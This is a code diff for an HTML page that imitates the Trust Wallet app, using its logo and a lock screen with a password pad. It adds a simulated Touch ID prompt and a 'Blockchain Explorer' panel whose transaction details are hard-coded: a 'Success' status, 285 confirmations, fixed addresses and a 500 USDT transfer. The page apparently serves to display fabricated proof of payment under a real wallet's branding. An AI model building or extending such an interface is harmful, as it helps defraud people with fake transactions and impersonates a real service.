@@ -222,6 +222,108 @@
         </div>
     </div>
     
+    <!-- Biometric Authentication Overlay -->
+    <div id="biometric-overlay" class="modal">
+        <div class="biometric-container">
+            <div class="biometric-content">
+                <h3>Touch ID</h3>
+                <p>Verify your identity</p>
+                <div class="fingerprint-container">
+                    <div id="fingerprint-icon" class="fingerprint-icon">
+                        <i class="fas fa-fingerprint"></i>
+                    </div>
+                    <div id="fingerprint-scanning" class="fingerprint-scanning"></div>
+                </div>
+                <div id="biometric-status" class="biometric-status">Touch sensor</div>
+                <button id="cancel-biometric" class="cancel-biometric">Cancel</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Blockchain Explorer Overlay -->
+    <div id="explorer-overlay" class="explorer-overlay">
+        <div class="explorer-header">
+            <button id="close-explorer" class="explorer-back-button">
+                <i class="fas fa-arrow-left"></i>
+            </button>
+            <div class="explorer-title">Blockchain Explorer</div>
+            <button class="explorer-button">
+                <i class="fas fa-ellipsis-v"></i>
+            </button>
+        </div>
+        <div class="explorer-body">
+            <div class="explorer-search-container">
+                <div class="explorer-search">
+                    <i class="fas fa-search"></i>
+                    <input type="text" id="explorer-search-input" placeholder="Search by Address / Txn Hash / Block / Token">
+                </div>
+            </div>
+            
+            <div class="explorer-transaction">
+                <div class="explorer-section">
+                    <div class="explorer-section-header">
+                        <h3>Transaction Details</h3>
+                        <span class="explorer-status success">Success</span>
+                    </div>
+                    
+                    <div class="explorer-detail-rows">
+                        <div class="explorer-detail-row">
+                            <div class="explorer-detail-label">Transaction Hash:</div>
+                            <div id="explorer-tx-hash" class="explorer-detail-value">0x8a65d7c4f5f43c3b39...</div>
+                        </div>
+                        <div class="explorer-detail-row">
+                            <div class="explorer-detail-label">Status:</div>
+                            <div class="explorer-detail-value"><span class="explorer-badge success">Success</span> <span class="explorer-confirmations">285 Block Confirmations</span></div>
+                        </div>
+                        <div class="explorer-detail-row">
+                            <div class="explorer-detail-label">Timestamp:</div>
+                            <div id="explorer-timestamp" class="explorer-detail-value">Mar-15-2024 02:32:15 PM +UTC</div>
+                        </div>
+                        <div class="explorer-detail-row">
+                            <div class="explorer-detail-label">From:</div>
+                            <div id="explorer-from" class="explorer-detail-value address">0x742d35Cc6634C0532925a3b844Bc454e4438f44e</div>
+                        </div>
+                        <div class="explorer-detail-row">
+                            <div class="explorer-detail-label">To:</div>
+                            <div id="explorer-to" class="explorer-detail-value address">0x9B3a54D092f6B4b3d2eC676cd589f124E9921E71</div>
+                        </div>
+                        <div class="explorer-detail-row">
+                            <div class="explorer-detail-label">Value:</div>
+                            <div id="explorer-value" class="explorer-detail-value">0 BNB</div>
+                        </div>
+                        <div class="explorer-detail-row">
+                            <div class="explorer-detail-label">Transaction Fee:</div>
+                            <div class="explorer-detail-value">0.000105 BNB ($0.05)</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="explorer-section">
+                    <div class="explorer-section-header">
+                        <h3>Token Transfer</h3>
+                    </div>
+                    
+                    <div class="explorer-token-transfer">
+                        <div class="explorer-token-icon">
+                            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT">
+                        </div>
+                        <div class="explorer-token-details">
+                            <div class="explorer-token-from-to">
+                                <span class="explorer-address-short">0x742d...8f44e</span>
+                                <i class="fas fa-arrow-right"></i>
+                                <span class="explorer-address-short">0x9B3a...21E71</span>
+                            </div>
+                            <div class="explorer-token-info">
+                                <span>For</span>
+                                <span id="explorer-token-amount" class="explorer-token-amount">500 USDT</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
     <!-- Risk Warning Banner -->
     <div id="risk-warning" class="risk-warning">
         <div class="risk-warning-content">
@@ -241,10 +343,11 @@
         <!-- Lock Screen -->
         <div id="lock-screen" class="screen">
             <div class="lock-header">
-                <img src="https://trustwallet.com/assets/images/trust_logo.png" alt="Trust Wallet" class="lock-logo">
+                <img src="https://trustwallet.com/assets/images/trust_logo.svg" alt="Trust Wallet" class="lock-logo">
+                <div class="lock-subtitle">Secure and trusted multi-chain crypto wallet</div>
             </div>
             <div class="passcode-container">
-                <h3>Enter Passcode</h3>
+                <h3>Password</h3>
                 <div class="passcode-dots">
                     <div class="dot"></div>
                     <div class="dot"></div>
@@ -267,6 +370,13 @@
                     <button class="numpad-key biometric" data-key="bio"><i class="fas fa-fingerprint"></i></button>
                     <button class="numpad-key" data-key="0">0</button>
                     <button class="numpad-key backspace" data-key="back"><i class="fas fa-backspace"></i></button>
+                </div>
+                
+                <button id="unlock-button" class="unlock-button">Unlock</button>
+                
+                <div class="reset-wallet-container">
+                    <p>Can't login? You can erase your current wallet and set up a new one</p>
+                    <button id="reset-wallet-button" class="reset-wallet-button">Reset wallet</button>
                 </div>
             </div>
         </div>
